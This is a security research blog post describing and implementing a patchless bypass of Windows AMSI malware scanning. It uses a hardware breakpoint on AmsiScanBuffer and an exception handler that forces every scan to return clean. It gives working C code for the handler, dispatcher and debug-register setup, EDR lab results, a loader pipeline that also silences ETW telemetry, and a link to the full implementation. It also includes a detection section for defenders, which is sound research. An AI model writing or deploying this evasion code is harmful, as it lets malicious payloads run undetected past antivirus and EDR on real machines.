# https://trexnegro.github.io/posts/patchless-amsi-bypass-hwbp/

Patchless AMSI Bypass via Hardware Breakpoints — Implementation Notes

Contents

> **TL;DR** — Pointing `DR0` at `amsi!AmsiScanBuffer` and registering a vectored exception handler lets us short-circuit every AMSI scan to `AMSI_RESULT_CLEAN` without writing a single byte to `amsi.dll`. No `.text` patches, no `WriteProcessMemory` against `amsi`, no detectable inline hooks. Memory-integrity scanners see nothing because nothing was modified.

## Background

The Antimalware Scan Interface (`amsi.dll`) is Microsoft’s user-mode scan barrier shipped with Windows since 10. PowerShell, VBScript hosts, JavaScript in MSHTML, Office VBA, .NET `Assembly.Load`, and any third-party scanner can hand a buffer to `AmsiScanBuffer()` and ask “is this malicious?” — `amsi.dll` forwards the buffer to whichever AV/EDR has registered a provider DLL (Defender’s `MpOav.dll`, CrowdStrike’s `CSAmsiProvider`, SentinelOne, etc.).

For an offensive operator running .NET assemblies, PowerShell scripts, or in-memory payloads, AMSI is the consistent first line of defense. **If AMSI returns CLEAN, the host runs the payload.**

The classic 2018 bypass was patching `amsi!AmsiScanBuffer`’s first few bytes with `xor eax,eax; ret` or similar. Every defender vendor has signatured this byte sequence by now — Defender, CrowdStrike, SentinelOne all flag the patch on memory scan. So the offensive community moved to **patchless** approaches.

Hardware breakpoints on `AmsiScanBuffer` have been documented since at least 2021 ( [RastaMouse](https://rastamouse.me/memory-patching-amsi-bypass/), [@TheD1rkMtr](https://github.com/D1rkMtr/UnhookingPatch), [TheEnergyStory’s `PatchlessEtwAndAmsiBypass`](https://github.com/TheEnergyStory/PatchlessEtwAndAmsiBypass)). What follows is my own implementation, the stack mechanics that caught me off guard, and how it composed against a commercial EDR in a recent licensed lab.

## Research question

Can we neutralize `AmsiScanBuffer` for the lifetime of a process **without writing a single byte to `amsi.dll`** or any of its dependencies, in a way that survives memory-integrity scanning by contemporary commercial EDRs?

## Hypothesis

A vectored exception handler (VEH) registered at the head of the handler chain, combined with `DR0` configured as an execute-type breakpoint on `amsi!AmsiScanBuffer`, can intercept every call to that function. The handler rewrites the AMSI result pointer in the caller’s stack frame, sets `RAX = S_OK`, advances `RIP` to the caller’s return address, and returns `EXCEPTION_CONTINUE_EXECUTION`. The body of `AmsiScanBuffer` never executes; no provider DLL is invoked; no scan occurs.

Because the technique never modifies `amsi.dll`’s `.text` section nor any other module, conventional integrity scans find nothing.

## Method

### 1\. Hardware debug register primer

x86-64 provides four hardware breakpoint registers: `DR0`, `DR1`, `DR2`, `DR3`. Each holds a linear address. `DR7` is the control register — for each slot it holds an enable bit, a condition (execute / write / read-or-write), and a length (1/2/4/8 bytes). `DR6` is the status register the CPU sets when a breakpoint fires, indicating which slot triggered.

The interesting property: when the CPU hits a slot configured as **execute-1byte** at the instruction at that address, it raises `STATUS_SINGLE_STEP` (`0x80000004`) **before** the instruction executes. We can catch that exception, inspect the thread’s `CONTEXT`, and modify it — including `RIP` — before resuming.

A given thread can hold up to 4 simultaneous hardware breakpoints. Setting them is `SetThreadContext` with `CONTEXT_DEBUG_REGISTERS` in `ContextFlags`. Crucially the DR set is **per thread**, not per process, which is one of the limitations of this approach.

### 2\. Vectored Exception Handlers

`AddVectoredExceptionHandler(1, handler)` registers a handler at the **head** of the VEH chain (the `1` is “first”). It runs before any SEH frame, before the OS hands the exception up the chain, before debuggers. Returning `EXCEPTION_CONTINUE_EXECUTION` resumes the thread with whatever `CONTEXT` modifications we made.

A single VEH can dispatch all four DR breakpoints by inspecting `ExceptionRecord->ExceptionAddress` (or, equivalently, the post-modification `Rip` of the context record) and looking it up in our own table.

### 3\. Target — `AmsiScanBuffer`

On Windows 11 24H2 the signature is:

`HRESULT WINAPI AmsiScanBuffer(
    _In_  HAMSICONTEXT amsiContext,    // RCX
    _In_  PVOID         buffer,        // RDX
    _In_  ULONG         length,        // R8
    _In_  LPCWSTR       contentName,   // R9
    _In_opt_ HAMSISESSION amsiSession, // [RSP+0x28]
    _Out_ AMSI_RESULT*  result         // [RSP+0x30]
);

`

The output parameter `result` is the 6th arg in MS x64 calling convention. The first four args go in `RCX/RDX/R8/R9`. Args 5+ live on the caller’s stack. At function entry — **before** the prologue executes anything — the caller’s stack looks like:

`RSP+0x00  → caller's return address
RSP+0x08  → shadow space for arg1 (RCX)
RSP+0x10  → shadow space for arg2 (RDX)
RSP+0x18  → shadow space for arg3 (R8)
RSP+0x20  → shadow space for arg4 (R9)
RSP+0x28  → arg5 (amsiSession)
RSP+0x30  → arg6 (AMSI_RESULT* result)

`

So **at the instant our breakpoint fires** (before any of `AmsiScanBuffer`’s prologue runs), `[RSP+0x30]` holds the pointer to the caller’s `AMSI_RESULT` output slot. That’s the value we need to overwrite.

`AMSI_RESULT_CLEAN = 0` is the magic value: anything `< AMSI_RESULT_DETECTED (0x8000)` is treated as clean by the host’s policy.

### 4\. The handler

`static LONG NTAPI amsi_handler(EXCEPTION_POINTERS *exc, PVOID target, PVOID user_ctx)
{
    CONTEXT *c = exc->ContextRecord;

    /* arg6 (AMSI_RESULT* result) lives at [RSP+0x30] at fn entry */
    PVOID *slot = (PVOID *)(c->Rsp + 0x30);
    if (writable_probe(slot, sizeof(PVOID))) {
        AMSI_RESULT *result_ptr = (AMSI_RESULT *)*slot;
        if (result_ptr && writable_probe(result_ptr, sizeof(AMSI_RESULT)))
            *result_ptr = AMSI_RESULT_CLEAN;
    }

    c->Rax = 0;                                  /* S_OK */

    /* Pop the caller's return address, advance RSP past it */
    DWORD64 ret_addr = *(DWORD64 *)c->Rsp;
    c->Rip  = ret_addr;
    c->Rsp += 8;

    return EXCEPTION_CONTINUE_EXECUTION;
}

`

Three things going on:

1. **Probe `[RSP+0x30]` before dereferencing.** A bad pointer crashes the process — a flat detection signal. `writable_probe` calls `VirtualQuery` and rejects anything not `MEM_COMMIT` \+ writable. AMSI hosts vary in how they allocate the output slot (stack vs heap), so this defensive check matters.

2. **Skip the function body.** Setting `RIP = *(RSP)` and incrementing `RSP` by 8 simulates a `RET` instruction without executing one. The next instruction the CPU runs is the caller’s instruction after the `call amsi!AmsiScanBuffer`. Function body never ran — no scan, no provider invocation, no allocation, no memory-mapped IO.

3. **`RAX = 0` returns `S_OK`** — the caller sees `AmsiScanBuffer` succeeded.


### 5\. VEH dispatcher

A single VEH handles all four DR slots. Match on `RIP`:

`static LONG NTAPI veh_dispatch(EXCEPTION_POINTERS *exc)
{
    if (exc->ExceptionRecord->ExceptionCode != STATUS_SINGLE_STEP)
        return EXCEPTION_CONTINUE_SEARCH;

    PVOID rip = (PVOID)exc->ContextRecord->Rip;
    for (int i = 0; i < 4; ++i) {
        if (!g_slots[i].active) continue;
        if (g_slots[i].target != rip) continue;

        LONG r = g_slots[i].handler(exc, g_slots[i].target, g_slots[i].user_ctx);

        /* CPU sets DR6.B0..B3 to indicate which slot fired — we must clear */
        exc->ContextRecord->Dr6 = 0;
        /* Resume Flag: prevent same instr from re-firing if RIP unchanged */
        exc->ContextRecord->EFlags |= 0x10000;
        return r;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

`

Two non-obvious points:

- **Clear `DR6`.** The CPU sets bits `B0`..`B3` of `DR6` to indicate which `DRn` fired. If you don’t clear them, the next exception’s `DR6` still shows your previous slot, which can confuse downstream handlers (including a real debugger if attached).

- **Set the Resume Flag (`RF`, bit `0x10000` of `EFLAGS`).** Without `RF` set, if the handler returns `EXCEPTION_CONTINUE_EXECUTION` but leaves `RIP` pointing at the same address, the CPU re-fires the breakpoint immediately — infinite loop. In our handler we _do_ change `RIP`, so it’s belt-and-braces, but if you ever write a “logging” handler that doesn’t redirect, you absolutely need `RF`.


### 6\. Arming `DR0` \+ `DR7`

`ctx.Dr0 = (DWORD64)AmsiScanBuffer_addr;

/* DR7 layout:
*   bit 0      = L0 (local enable for slot 0)
*   bits 16-17 = condition for slot 0 (00 = execute)
*   bits 18-19 = length for slot 0 (00 = 1 byte)
* All zeros except bit 0 for slot 0 execute-1byte.
*/
ctx.Dr7 |= 1;
ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
SetThreadContext(GetCurrentThread(), &ctx);

`

For `DR1` (used for the equivalent `EtwEventWrite` short-circuit), the enable bit is bit 2, and the condition/length nibble is bits 20-23. Both default to zero, so the only write is the enable bit.

## Results

Tested in a licensed lab against a contemporary commercial EDR that:

- Uses **kernel-mode telemetry callbacks** (`PsSetCreateProcessNotifyRoutine`, `PsSetLoadImageNotifyRoutine`, mini-filter on file ops) — i.e., it does _not_ rely primarily on inline hooks in user-mode `ntdll.dll` for telemetry.
- Maintains a memory-integrity scan that flags known AMSI patches (`B8 57 00 07 80 C3` pattern and variants).
- Registers an AMSI provider DLL.

Observed behavior with the bypass loaded:

- PowerShell `[Reflection.Assembly]::Load($bytes)` invocations of buffers that **would** trip Defender’s signature db now load silently. `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')` reports the scan returned `AMSI_RESULT_CLEAN`.
- The EDR’s behavior-rule that detects “AMSI bypass via inline patch” does not fire — because no patch exists.
- Memory scan post-execution finds no modifications in `amsi.dll`’s loaded image.

Latency overhead per `AmsiScanBuffer` call: ~5-15 microseconds (single VEH dispatch + context modify). Negligible.

No EDR-side alert was generated in the validation window. **This does not prove undetectability** — it proves the EDR’s current behavior-rule set does not include a check for the specific class. Section below covers what such a check would look like.

## Detection avenues (for defenders)

The technique leaves four observable artifacts. None are visible without **specifically looking** for them:

### 1\. Vectored Exception Handler chain

VEHs are stored in `ntdll!LdrpVectorHandlerList` (Win10+). A defender can walk this list and flag any handler installed by a process that doesn’t usually need one. PowerShell does not register VEHs. .NET applications do — Windows Forms uses them for crash reporting. So discriminating malicious vs benign VEHs requires more than presence — it requires inspecting the handler function bytes.

**Detection sketch**: enumerate VEH chain. For each handler, disassemble first 64 bytes. If it touches `Dr0`-`Dr3`, `DR6`, or `EFLAGS``RF`, flag.

### 2\. Debug register state

`GetThreadContext(thread, CONTEXT_DEBUG_REGISTERS)` returns the current `DR0`-`DR7` for any thread. A monitor can periodically poll. Any thread with `DR0` pointing inside a known-sensitive function (`amsi!*`, `ntdll!EtwEventWrite`, `ntdll!NtTraceControl`) is suspicious.

**Detection sketch**: enumerate all threads in process; sample `Dr0`-`Dr3`; map to module+function via `SymFromAddr`; alert on AMSI/ETW targets.

The CrowdStrike Falcon Sensor has been observed to do this (intermittent thread enumeration including DR state, per public CS engineering posts circa 2024).

### 3\. Kernel callback on `KeContextFromKframes` / `NtSetContextThread`

A driver can hook `NtSetContextThread` and inspect `CONTEXT_DEBUG_REGISTERS` writes. Any call setting `DR0` to a non-zero value from user-mode should be rare. PROCMON-style minifilters can log this. The cost is real — every legitimate debugger does this — so a defender has to allow `WinDbg` / VS debugger paths.

### 4\. `RIP` discontinuity in stack walks

When the handler skips `AmsiScanBuffer`’s body, the caller’s return path goes: `caller → call amsi!AmsiScanBuffer → (HW BP, VEH redirect) → caller_next_instr`. A stack walker that captures _at the moment of return_ sees the caller’s `RIP` but no `amsi!AmsiScanBuffer` frame in between. If the EDR snapshots stacks on AMSI scan completion events (via the provider DLL callback) and expects `amsi!AmsiScanBuffer` on the stack at scan-finish — the absence is a tell.

**Detection sketch**: the AMSI provider DLL, on scan-finish callback, captures `RtlCaptureStackBackTrace`. If `amsi!AmsiScanBuffer` is not in the captured trace, flag.

This is the highest-quality detection of the four because it requires no thread enumeration, no DR polling, no module-table walking — just a single stack check at scan time.

## Limitations

- **Per-thread, not per-process.** Each new thread the host spawns starts with `DR0 = 0`. A SetWindowsHookEx, an `RtlRegisterThreadWithCsrss` worker thread, a thread pool work item — any of these can call `AmsiScanBuffer` from a thread that has no breakpoint armed and slip through. Mitigation: register a `TLS callback` or `LdrpInitializeThread` shim that arms the DR on every new thread. The repo’s full implementation does this; the snippets above are single-thread for clarity.

- **VEH chain visible.** Discussed above. A targeted defender can detect.

- **Does not bypass kernel-mode scan.** AMSI providers can scan from kernel context (Defender’s `MpEng.exe` is user-mode, but kernel callbacks fire too). HW BP intercepts user-mode `AmsiScanBuffer` only.

- **Single AMSI provider model.** If a host implements its own AMSI-equivalent via `IAntimalwareProvider::Scan` without routing through `amsi!AmsiScanBuffer`, this bypass does nothing.


## Composition

A loader pipeline I’ve found stable for authorized-engagement use chains:

1. **VEH initialization** (this post).
2. **`DR0` → `AmsiScanBuffer`** (this post).
3. **`DR1` → `ntdll!NtTraceControl`** — same VEH dispatcher, the ETW equivalent. Patching `EtwEventWrite` is signatured. Hitting the lower layer `NtTraceControl` is harder to fingerprint and silences a wider set of provider events.
4. **`ntdll` selective refresh from `\KnownDlls`** — restore pristine bytes for any in-line hooks that were placed by the EDR on `ntdll`’s commonly-targeted Nt\* exports. Only matters for EDRs that use inline hooks (less common than 5 years ago — most major vendors moved to kernel callbacks).
5. **Indirect syscalls** — for any subsequent Nt\* call, jump to the real `syscall` instruction inside `ntdll`’s stub rather than calling the stub via its symbol. Sidesteps stack-walking heuristics that flag “syscall coming from unbacked memory”.

Each layer is independently testable. The AMSI HW BP alone — what this post covers — gets you past the AMSI scan barrier. The full pipeline gets you to “no user-mode telemetry, no in-line hooks, no syscall provenance fingerprint”.

## Artifacts

The full reference implementation — VEH dispatcher, AMSI handler, ETW handler, helpers, a minimal self-test, and a `mingw-w64` cross-compile script — is in the unified research repo:

→ **[github.com/TREXNEGRO/Research/tree/master/patchless-amsi-bypass](https://github.com/TREXNEGRO/Research/tree/master/patchless-amsi-bypass)**

The shipped subset is the two validated primitives covered in this post: `BP_AMSI_HWBP` (DR0 → `amsi!AmsiScanBuffer`) and `BP_ETW_PATCH` (DR1 → `ntdll!EtwEventWrite`). It’s ~500 lines of C across six files. Builds clean on `mingw-w64 gcc 13+` (`./build.sh` from a Linux host) and on MSVC 2022. The minimal self-test loads `amsi.dll`, calls `AmsiScanBuffer` on the standard AMSI test string, and asserts the result is `AMSI_RESULT_CLEAN` — i.e. the HW BP intercepted the call and rewrote the output slot.

What the repo intentionally does _not_ include yet:

- ntdll selective refresh (`\KnownDlls`) — discussed in **Composition** below but not validated empirically in this lab against current EDR products. Will be added as a separate entry once I’ve benchmarked it cleanly.
- Indirect syscalls (`Hells/Halos/Tartarus` gate family) — same. The composition section gives the shape; the reference port is not in this entry.

License is MIT. PRs / issues / corrections welcome.

## References

1. RastaMouse — “Memory Patching AMSI Bypass” (historical baseline). [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/)
2. `TheEnergyStory/PatchlessEtwAndAmsiBypass` — first widely-cited HW-BP reference implementation. [https://github.com/TheEnergyStory/PatchlessEtwAndAmsiBypass](https://github.com/TheEnergyStory/PatchlessEtwAndAmsiBypass)
3. `D1rkMtr/UnhookingPatch` — adjacent technique, useful comparison.
4. Microsoft AMSI documentation. [https://learn.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal](https://learn.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal)
5. Intel SDM Vol. 3B, §17 “Debug, Branch Profile, TSC, and Resource Monitoring Features” — `DR0`-`DR7` semantics, single-step exception, `RF` flag.
6. Microsoft Vectored Exception Handlers documentation. [https://learn.microsoft.com/en-us/windows/win32/debug/vectored-exception-handling](https://learn.microsoft.com/en-us/windows/win32/debug/vectored-exception-handling)

* * *

_This implementation was validated in a licensed lab against one specific commercial EDR. Behavior against other products may differ. Use only on systems you own or for which you have explicit, written authorization to test._

[Research](https://trexnegro.github.io/categories/research/), [EDR Evasion](https://trexnegro.github.io/categories/edr-evasion/)

[amsi](https://trexnegro.github.io/tags/amsi/) [etw](https://trexnegro.github.io/tags/etw/) [edr](https://trexnegro.github.io/tags/edr/) [windows](https://trexnegro.github.io/tags/windows/) [hwbp](https://trexnegro.github.io/tags/hwbp/) [veh](https://trexnegro.github.io/tags/veh/) [debug-registers](https://trexnegro.github.io/tags/debug-registers/) [patchless](https://trexnegro.github.io/tags/patchless/)

This post is licensed under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/) by the author.

Share[Twitter](https://twitter.com/intent/tweet?text=Patchless%20AMSI%20Bypass%20via%20Hardware%20Breakpoints%20%E2%80%94%20Implementation%20Notes%20-%20SixSixSix&url=https%3A%2F%2Ftrexnegro.github.io%2Fposts%2Fpatchless-amsi-bypass-hwbp%2F)[Facebook](https://www.facebook.com/sharer/sharer.php?title=Patchless%20AMSI%20Bypass%20via%20Hardware%20Breakpoints%20%E2%80%94%20Implementation%20Notes%20-%20SixSixSix&u=https%3A%2F%2Ftrexnegro.github.io%2Fposts%2Fpatchless-amsi-bypass-hwbp%2F)[Telegram](https://t.me/share/url?url=https%3A%2F%2Ftrexnegro.github.io%2Fposts%2Fpatchless-amsi-bypass-hwbp%2F&text=Patchless%20AMSI%20Bypass%20via%20Hardware%20Breakpoints%20%E2%80%94%20Implementation%20Notes%20-%20SixSixSix)

## Trending Tags

[methodology](https://trexnegro.github.io/tags/methodology/) [byovd](https://trexnegro.github.io/tags/byovd/) [cortex-xdr](https://trexnegro.github.io/tags/cortex-xdr/) [kasan](https://trexnegro.github.io/tags/kasan/) [kernel](https://trexnegro.github.io/tags/kernel/) [android](https://trexnegro.github.io/tags/android/) [etw](https://trexnegro.github.io/tags/etw/) [fortify-source](https://trexnegro.github.io/tags/fortify-source/) [hvci](https://trexnegro.github.io/tags/hvci/) [indirect-syscalls](https://trexnegro.github.io/tags/indirect-syscalls/)